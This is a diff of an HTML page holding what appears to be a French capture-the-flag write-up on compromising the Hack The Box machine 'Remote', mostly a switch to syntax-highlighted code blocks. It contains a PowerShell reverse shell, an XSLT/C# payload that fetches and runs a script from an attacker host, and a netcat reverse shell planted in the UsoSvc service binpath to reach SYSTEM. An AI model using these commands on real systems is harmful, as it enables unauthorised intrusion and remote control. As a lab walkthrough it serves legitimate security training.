+      <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>$args.split<span style="color:#f92672">(</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">)</span>.length -gt 1<span style="color:#f92672">){</span>
+                $pinfo <span style="color:#f92672">=</span> New-Object System.Diagnostics.ProcessStartInfo
+                $pinfo.FileName <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cmd.exe&#34;</span>
+                $pinfo.RedirectStandardError <span style="color:#f92672">=</span> $true
+                $pinfo.RedirectStandardOutput <span style="color:#f92672">=</span> $true
+                $pinfo.UseShellExecute <span style="color:#f92672">=</span> $false
+                $pinfo.Arguments <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/c </span>$out<span style="color:#e6db74"> </span>$args<span style="color:#e6db74">&#34;</span>
+                $p <span style="color:#f92672">=</span> New-Object System.Diagnostics.Process
+                $p.StartInfo <span style="color:#f92672">=</span> $pinfo
+                $p.Start<span style="color:#f92672">()</span> | Out-Null
+                $p.WaitForExit<span style="color:#f92672">()</span>
+                $stdout <span style="color:#f92672">=</span> $p.StandardOutput.ReadToEnd<span style="color:#f92672">()</span>
+                $stderr <span style="color:#f92672">=</span> $p.StandardError.ReadToEnd<span style="color:#f92672">()</span>
+                <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>$p.ExitCode -ne 0<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+                    $res <span style="color:#f92672">=</span> $stderr
+                <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+                    $res <span style="color:#f92672">=</span> $stdout
+                <span style="color:#f92672">}</span>
+      <span style="color:#f92672">}</span>
+      <span style="color:#66d9ef">else</span><span style="color:#f92672">{</span>
+        $res <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>&amp;<span style="color:#e6db74">&#34;</span>$out<span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#34;</span>$args<span style="color:#e6db74">&#34;</span><span style="color:#f92672">)</span> | out-string;
+      <span style="color:#f92672">}</span>
+    <span style="color:#f92672">}</span>
+    <span style="color:#66d9ef">else</span><span style="color:#f92672">{</span>
+      $res <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>&amp;<span style="color:#e6db74">&#34;</span>$out<span style="color:#e6db74">&#34;</span><span style="color:#f92672">)</span> | out-string;
+    <span style="color:#f92672">}</span>
+    <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>$res -ne $null<span style="color:#f92672">){</span>
+        $writer.WriteLine<span style="color:#f92672">(</span>$res<span style="color:#f92672">)</span>
+    <span style="color:#f92672">}</span>
+  <span style="color:#f92672">}</span>
+<span style="color:#f92672">}</span>While <span style="color:#f92672">(</span>!$out.equals<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;exit&#34;</span><span style="color:#f92672">))</span>
+$writer.close<span style="color:#f92672">()</span>;
+$socket.close<span style="color:#f92672">()</span>;
+$stream.Dispose<span style="color:#f92672">()</span>
+</code></pre></div><p>Afin de pouvoir télécharger ce script depuis la cible, on va l&rsquo;héberger sur un serveur web temporaire. le module <code>http.server</code> de Python répond parfaitement à ce besoin.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
+</code></pre></div><p>Par la suite, on prépare notre payload afin d&rsquo;aller chercher le fichier ps1 et de l&rsquo;exécuter directement en mémoire. Bien entendu, il est également nécessaire de renseigner les identifiants du compte de l&rsquo;application.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;?xml version=&#34;1.0&#34;?&gt;&lt;xsl:stylesheet version=&#34;1.0&#34; \
+</span><span style="color:#e6db74">xmlns:xsl=&#34;http://www.w3.org/1999/XSL/Transform&#34; xmlns:msxsl=&#34;urn:schemas-microsoft-com:xslt&#34; \
+</span><span style="color:#e6db74">xmlns:csharp_user=&#34;http://csharp.mycompany.com/mynamespace&#34;&gt;\
+</span><span style="color:#e6db74">&lt;msxsl:script language=&#34;C#&#34; implements-prefix=&#34;csharp_user&#34;&gt;public string xml() \
+</span><span style="color:#e6db74">{ string cmd = &#34;IEX (New-Object Net.WebClient).DownloadString(\&#39;</span>http://10.10.14.5:8000/minireverse.ps1<span style="color:#ae81ff">\&#39;</span><span style="color:#f92672">)</span><span style="color:#e6db74">&#34;; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
+</span><span style="color:#e6db74"> proc.StartInfo.FileName = &#34;</span>powershell.exe<span style="color:#e6db74">&#34;; proc.StartInfo.Arguments = cmd;\
+</span><span style="color:#e6db74"> proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
+</span><span style="color:#e6db74"> proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
+</span><span style="color:#e6db74"> &lt;/msxsl:script&gt;&lt;xsl:template match=&#34;</span>/<span style="color:#e6db74">&#34;&gt; &lt;xsl:value-of select=&#34;</span>csharp_user:xml<span style="color:#f92672">()</span><span style="color:#e6db74">&#34;/&gt;\
+</span><span style="color:#e6db74"> &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; &#39;;
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">login = &#34;</span>admin@htb.local<span style="color:#e6db74">&#34;;
+</span><span style="color:#e6db74">password=&#34;</span>baconandcheese<span style="color:#e6db74">&#34;;
+</span><span style="color:#e6db74">host = &#34;</span>http://10.10.10.180<span style="color:#e6db74">&#34;;
+</span><span style="color:#e6db74">
+</span></code></pre></div><p>Une fois la totalité des éléments en place, on lance un netcat en écoute sur notre machine, puis on lance le script python d&rsquo;exploitation. Si tout fonctionne correctement, vous dévriez voir une requête <code>GET</code> passer dans les logs du serveur web.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Shell 1</span>
 $ python3 46153.py      
 Start
-[]
+<span style="color:#f92672">[]</span>
 
-# Shell 2
+<span style="color:#75715e"># Shell 2</span>
 $ python3 -m http.server
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-10.10.10.180 - - [30/Mar/2020 13:42:05] &quot;GET /minireverse.ps1 HTTP/1.1&quot; 200 -
+Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
+10.10.10.180 - - <span style="color:#f92672">[</span>30/Mar/2020 13:42:05<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /minireverse.ps1 HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
 
-# Shell 3
-$ nc -lvvp 5577
-listening on [any] 5577 ...
+<span style="color:#75715e"># Shell 3</span>
+$ nc -lvvp <span style="color:#ae81ff">5577</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">5577</span> ...
 10.10.10.180: inverse host lookup failed: Unknown host
-connect to [10.10.14.7] from (UNKNOWN) [10.10.10.180] 49902
-</code></pre>
-
-<p>b00m ! Un joli shell utilisateur :).
+connect to <span style="color:#f92672">[</span>10.10.14.7<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.180<span style="color:#f92672">]</span> <span style="color:#ae81ff">49902</span>
+</code></pre></div><p>b00m ! Un joli shell utilisateur :).
 Après énumération des utilisateur, la machine ne disposant pas d&rsquo;utilisateurs particuliers, le premier flag peut être récupéré dans le répertoire <code>C:\Users\Public</code>.</p>
-
-<h2 id="reconnaissance-et-prise-d-information">Reconnaissance et prise d&rsquo;information</h2>
-
+<h2 id="reconnaissance-et-prise-dinformation">Reconnaissance et prise d&rsquo;information</h2>
 <p>Comme toute compromission qui se respecte, l&rsquo;étape suivante est la collecte d&rsquo;informations au sujet de la machine afin d&rsquo;identifier de potentielles faiblesses !
-J&rsquo;ai profité de travailler sur cette machine pour tester un outil dont j&rsquo;avais déjà entendu parlé mais que je n&rsquo;avais jamais utilisé, j&rsquo;ai nommé <code>winPEAS</code> (<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS</a>). Il s&rsquo;agit d&rsquo;un binaire permettant d&rsquo;automatiser les tâches classiques d&rsquo;énumération à des fins d&rsquo;escalade de privilège.</p>
-
+J&rsquo;ai profité de travailler sur cette machine pour tester un outil dont j&rsquo;avais déjà entendu parlé mais que je n&rsquo;avais jamais utilisé, j&rsquo;ai nommé <code>winPEAS</code> (<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)</a>. Il s&rsquo;agit d&rsquo;un binaire permettant d&rsquo;automatiser les tâches classiques d&rsquo;énumération à des fins d&rsquo;escalade de privilège.</p>
 <p>Spoiler : il s&rsquo;avère que cet outil est génial.</p>
-
 <p>De la même façon donc que pour le précédent reverse shell, nous allons utiliser un serveur web Python afin d&rsquo;accéder au binaire.
 Depuis notre reverse shell, nous sommes en mesure de télécharger directement le fichier, puis de l&rsquo;exécuter. On peut par exemple utiliser directement un <code>wget</code>depuis l&rsquo;interpréteur Powershell.</p>
-
 <p>Cependant, petite astuce, afin de pouvoir exécuter le <code>wget</code>, il est nécessaire de lancer ce dernier en argument d&rsquo;un autre processus powershell, comme ceci.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">powershell.exe wget http://10.10.14.7:8000/winPEAS.exe -OutFile <span style="color:#e6db74">&#34;C:\tmp\winpeas.exe&#34;</span>
+</code></pre></div><p>Une fois cela fait, la collecte peut commencer ! La sortie ci-dessous est volontairement réduite afin de ne garder que les éléments potentiellement intéressants.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">.<span style="color:#ae81ff">\w</span>inpeas.exe
 
-<pre><code class="language-bash">powershell.exe wget http://10.10.14.7:8000/winPEAS.exe -OutFile &quot;C:\tmp\winpeas.exe&quot;
-</code></pre>
-
-<p>Une fois cela fait, la collecte peut commencer ! La sortie ci-dessous est volontairement réduite afin de ne garder que les éléments potentiellement intéressants.</p>
-
-<pre><code class="language-bash">.\winpeas.exe
-
-[...]
-[+] Basic System Information(T1082&amp;T1124&amp;T1012&amp;T1497&amp;T1212)
-  [?] Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits
+<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Basic System Information<span style="color:#f92672">(</span>T1082&amp;T1124&amp;T1012&amp;T1497&amp;T1212<span style="color:#f92672">)</span>
+  <span style="color:#f92672">[</span>?<span style="color:#f92672">]</span> Check <span style="color:#66d9ef">if</span> the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits
    Hostname: remote
-   ProductName: Windows Server 2019 Standard
+   ProductName: Windows Server <span style="color:#ae81ff">2019</span> Standard
    EditionID: ServerStandard
-   ReleaseId: 1809
+   ReleaseId: <span style="color:#ae81ff">1809</span>
    BuildBranch: rs5_release
-   CurrentMajorVersionNumber: 10
+   CurrentMajorVersionNumber: <span style="color:#ae81ff">10</span>
    CurrentVersion: 6.3
    Architecture: AMD64
-   ProcessorCount: 4
+   ProcessorCount: <span style="color:#ae81ff">4</span>
    SystemLang: en-US
-   KeyboardLang: English (United States)
-   TimeZone: (UTC-05:00) Eastern Time (US &amp; Canada)
+   KeyboardLang: English <span style="color:#f92672">(</span>United States<span style="color:#f92672">)</span>
+   TimeZone: <span style="color:#f92672">(</span>UTC-05:00<span style="color:#f92672">)</span> Eastern Time <span style="color:#f92672">(</span>US &amp; Canada<span style="color:#f92672">)</span>
    IsVirtualMachine: True
    Current Time: 3/22/2020 12:35:20 PM
    HighIntegrity: False
    PartOfDomain: False
    Hotfixes: KB4534119, KB4462930, KB4516115, KB4523204, KB4464455,
 
- [?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
-   OS Build Number: 17763
-      [!] CVE-2019-0836 : VULNERABLE
-       [&gt;] https://exploit-db.com/exploits/46718
-       [&gt;] https://decoder.cloud/2019/04/29/combinig-luafv-postluafvpostreadwrite-race-condition-pe-with-diaghub-collector-exploit-from-standard-user-to-system/
-      [!] CVE-2019-0841 : VULNERABLE
-       [&gt;] https://github.com/rogue-kdc/CVE-2019-0841
-       [&gt;] https://rastamousee/tags/cve-2019-0841/
-      [!] CVE-2019-1064 : VULNERABLE
-       [&gt;] https://www.rythmstick.net/posts/cve-2019-1064/
-      [!] CVE-2019-1130 : VULNERABLE
-       [&gt;] https://github.com/S3cur3Th1sSh1t/SharpByeBear
-      [!] CVE-2019-1253 : VULNERABLE
-       [&gt;] https://github.com/padovah4ck/CVE-2019-1253
-      [!] CVE-2019-1315 : VULNERABLE
-       [&gt;] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html
-      [!] CVE-2019-1385 : VULNERABLE
-       [&gt;] https://www.youtube.com/watch?v=K6gHnr-VkAg
-      [!] CVE-2019-1388 : VULNERABLE
-       [&gt;] https://github.com/jas502n/CVE-2019-1388
-      [!] CVE-2019-1405 : VULNERABLE
-       [&gt;] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/
-[...]
+ <span style="color:#f92672">[</span>?<span style="color:#f92672">]</span> Windows vulns search powered by Watson<span style="color:#f92672">(</span>https://github.com/rasta-mouse/Watson<span style="color:#f92672">)</span>
+   OS Build Number: <span style="color:#ae81ff">17763</span>
+      <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> CVE-2019-0836 : VULNERABLE
+       <span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> https://exploit-db.com/exploits/46718
+       <span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> https://decoder.cloud/2019/04/29/combinig-luafv-postluafvpostreadwrite-race-condition-pe-with-diaghub-collector-exploit-from-standard-user-to-system/
+      <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> CVE-2019-0841 : VULNERABLE
+       <span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> https://github.com/rogue-kdc/CVE-2019-0841
+       <span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> https://rastamousee/tags/cve-2019-0841/
+      <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> CVE-2019-1064 : VULNERABLE
+       <span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> https://www.rythmstick.net/posts/cve-2019-1064/
+      <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> CVE-2019-1130 : VULNERABLE
+       <span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> https://github.com/S3cur3Th1sSh1t/SharpByeBear
+      <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> CVE-2019-1253 : VULNERABLE
+       <span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> https://github.com/padovah4ck/CVE-2019-1253
+      <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> CVE-2019-1315 : VULNERABLE
+       <span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html
+      <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> CVE-2019-1385 : VULNERABLE
+       <span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> https://www.youtube.com/watch?v<span style="color:#f92672">=</span>K6gHnr-VkAg
+      <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> CVE-2019-1388 : VULNERABLE
+       <span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> https://github.com/jas502n/CVE-2019-1388
+      <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> CVE-2019-1405 : VULNERABLE
+       <span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/
+<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
 
-[+] Looking for AutoLogon credentials(T1012)
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Looking <span style="color:#66d9ef">for</span> AutoLogon credentials<span style="color:#f92672">(</span>T1012<span style="color:#f92672">)</span>
    Some AutoLogon credentials were found!!
    DefaultUserName               :  Administrator
-[...]
+<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
 
-[+] Modifiable Services(T1007)
- [?] Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Modifiable Services<span style="color:#f92672">(</span>T1007<span style="color:#f92672">)</span>
+ <span style="color:#f92672">[</span>?<span style="color:#f92672">]</span> Check <span style="color:#66d9ef">if</span> you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
   LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
   UsoSvc: AllAccess, Start
 
-[+] Looking if you can modify any service registry()
- [?] Check if you can modify the registry of a service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-permissions
-  [-] Looks like you cannot change the registry of any service...
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Looking <span style="color:#66d9ef">if</span> you can modify any service registry<span style="color:#f92672">()</span>
+ <span style="color:#f92672">[</span>?<span style="color:#f92672">]</span> Check <span style="color:#66d9ef">if</span> you can modify the registry of a service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-permissions
+  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Looks like you cannot change the registry of any service...
 
-[+] Checking write permissions in PATH folders (DLL Hijacking)()
- [?] Check for DLL Hijacking in PATH folders https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dll-hijacking
-   C:\Windows\system32
-   C:\Windows
-   C:\Windows\System32\Wbem
-   C:\Windows\System32\WindowsPowerShell\v1.0\
-   C:\Windows\System32\OpenSSH\
-[...]
-</code></pre>
-
-<h2 id="escalade-de-privilège-et-flag-administrateur">Escalade de privilège et flag administrateur</h2>
-
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Checking write permissions in PATH folders <span style="color:#f92672">(</span>DLL Hijacking<span style="color:#f92672">)()</span>
+ <span style="color:#f92672">[</span>?<span style="color:#f92672">]</span> Check <span style="color:#66d9ef">for</span> DLL Hijacking in PATH folders https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dll-hijacking
+   C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32
+   C:<span style="color:#ae81ff">\W</span>indows
+   C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\W</span>bem
+   C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\W</span>indowsPowerShell<span style="color:#ae81ff">\v</span>1.0<span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>   C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\O</span>penSSH<span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+</code></pre></div><h2 id="escalade-de-privilège-et-flag-administrateur">Escalade de privilège et flag administrateur</h2>
 <p>Bien que souvent, des étapes supplémentaires soient nécessaires, pour cette machine, la phase d&rsquo;énumération précédente donne toutes les clés afin de monter en privilège.
 En effet, il semble que la machine soit sensible à différentes vulnérabilités kernel. Cependant, ce n&rsquo;est pas dans cette direction que nous allons nous tourner.
 Il semble en effet également que nous ayons les droits nécessaires pour interagir avec le service <code>UsoSvc</code>. Quelques recherches Internet nous amènent rapidement à la CVE-2019-1322, traitant justement du service <code>Update Orchestrator</code>.</p>
-
 <p>L&rsquo;idée principale derrière cela est de pouvoir modifier la configuration du service afin de le diriger vers un binaire potentiellement malveillant. Suite à cela, si nous sommes en capacité de redémarrer le service, le binaire configuré sera ainsi exécuté au lancement de ce dernier. Là où ça devient intéressant, c&rsquo;est que notre binaire serait exécuté avec les droits <code>SYSTEM</code> ;)</p>
-
 <p>On commence donc par s&rsquo;informer sur l&rsquo;état du service.</p>
-
-<pre><code class="language-bash">sc query usosvc
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sc query usosvc
 
 SERVICE_NAME: usosvc 
-        TYPE               : 30  WIN32  
-        STATE              : 4  RUNNING 
-                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
-        WIN32_EXIT_CODE    : 0  (0x0)
-        SERVICE_EXIT_CODE  : 0  (0x0)
+        TYPE               : <span style="color:#ae81ff">30</span>  WIN32  
+        STATE              : <span style="color:#ae81ff">4</span>  RUNNING 
+                                <span style="color:#f92672">(</span>STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN<span style="color:#f92672">)</span>
+        WIN32_EXIT_CODE    : <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>0x0<span style="color:#f92672">)</span>
+        SERVICE_EXIT_CODE  : <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>0x0<span style="color:#f92672">)</span>
         CHECKPOINT         : 0x0
         WAIT_HINT          : 0x0
-</code></pre>
-
-<p>Puis on tente de le stopper et on regarde à nouveau son état.</p>
-
-<pre><code class="language-bash">sc stop usosvc
+</code></pre></div><p>Puis on tente de le stopper et on regarde à nouveau son état.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sc stop usosvc
 
 SERVICE_NAME: usosvc 
-        TYPE               : 30  WIN32  
-        STATE              : 3  STOP_PENDING 
-                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
-        WIN32_EXIT_CODE    : 0  (0x0)
-        SERVICE_EXIT_CODE  : 0  (0x0)
+        TYPE               : <span style="color:#ae81ff">30</span>  WIN32  
+        STATE              : <span style="color:#ae81ff">3</span>  STOP_PENDING 
+                                <span style="color:#f92672">(</span>NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN<span style="color:#f92672">)</span>
+        WIN32_EXIT_CODE    : <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>0x0<span style="color:#f92672">)</span>
+        SERVICE_EXIT_CODE  : <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>0x0<span style="color:#f92672">)</span>
         CHECKPOINT         : 0x3
         WAIT_HINT          : 0x7530
 
 sc query usosvc
 
 SERVICE_NAME: usosvc 
-        TYPE               : 20  WIN32_SHARE_PROCESS  
-        STATE              : 1  STOPPED 
-        WIN32_EXIT_CODE    : 0  (0x0)
-        SERVICE_EXIT_CODE  : 0  (0x0)
+        TYPE               : <span style="color:#ae81ff">20</span>  WIN32_SHARE_PROCESS  
+        STATE              : <span style="color:#ae81ff">1</span>  STOPPED 
+        WIN32_EXIT_CODE    : <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>0x0<span style="color:#f92672">)</span>
+        SERVICE_EXIT_CODE  : <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>0x0<span style="color:#f92672">)</span>
         CHECKPOINT         : 0x0
         WAIT_HINT          : 0x0
 
-</code></pre>
-
-<p>Parfait ! Maintenant, place à la mise à jour ! L&rsquo;idée ici est de faire en sorte que le service exécute un revershe shell vers notre machine afin de récupérer un accès privilégié. Ainsi, de la même façon que pour le binaire <code>winPEAS</code> précédemment, on dépose un <code>netcat</code> sur la machine.</p>
-
+</code></pre></div><p>Parfait ! Maintenant, place à la mise à jour ! L&rsquo;idée ici est de faire en sorte que le service exécute un revershe shell vers notre machine afin de récupérer un accès privilégié. Ainsi, de la même façon que pour le binaire <code>winPEAS</code> précédemment, on dépose un <code>netcat</code> sur la machine.</p>
 <p>Par la suite, on modifie la configuration du service afin que ce dernier exécute notre netcat à son démarrage.</p>
-
-<pre><code class="language-bash">sc.exe config UsoSvc binpath=&quot;C:\tmp\nc64.exe 10.10.14.5 7788 -e cmd.exe&quot; 
-[SC] ChangeServiceConfig SUCCESS
-</code></pre>
-
-<p>Du côté de la machine attaquante, on ouvre également un netcat en écoute puis on redémarre le service depuis la cible.</p>
-
-<pre><code class="language-bash"># Target
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sc.exe config UsoSvc binpath<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;C:\tmp\nc64.exe 10.10.14.5 7788 -e cmd.exe&#34;</span> 
+<span style="color:#f92672">[</span>SC<span style="color:#f92672">]</span> ChangeServiceConfig SUCCESS
+</code></pre></div><p>Du côté de la machine attaquante, on ouvre également un netcat en écoute puis on redémarre le service depuis la cible.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Target</span>
 sc start usosvc
 
-# Attacker
-$ nc -lvvp 7788
-listening on [any] 7788 ...
+<span style="color:#75715e"># Attacker</span>
+$ nc -lvvp <span style="color:#ae81ff">7788</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">7788</span> ...
 10.10.10.180: inverse host lookup failed: Unknown host
-connect to [10.10.14.5] from (UNKNOWN) [10.10.10.180] 49787
-Microsoft Windows [Version 10.0.17763.107]
-(c) 2018 Microsoft Corporation. All rights reserved.
+connect to <span style="color:#f92672">[</span>10.10.14.5<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.180<span style="color:#f92672">]</span> <span style="color:#ae81ff">49787</span>
+Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.17763.107<span style="color:#f92672">]</span>
+<span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2018</span> Microsoft Corporation. All rights reserved.
 
-C:\Windows\system32&gt;whoami
+C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;whoami
 whoami
-nt authority\system
-</code></pre>
-
-<p>w00ted !</p>
+nt authority<span style="color:#ae81ff">\s</span>ystem
+</code></pre></div><p>w00ted !</p>
   </div>
   
 
@@ -666,7 +624,7 @@ nt authority\system
 var doNotTrack = false;
 if (!doNotTrack) {
 	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-	ga('create', 'UA-126182747-1', 'auto');
+	ga('create', 'G-GB7QC0EDF8', 'auto');
 	
 	ga('send', 'pageview');
 }
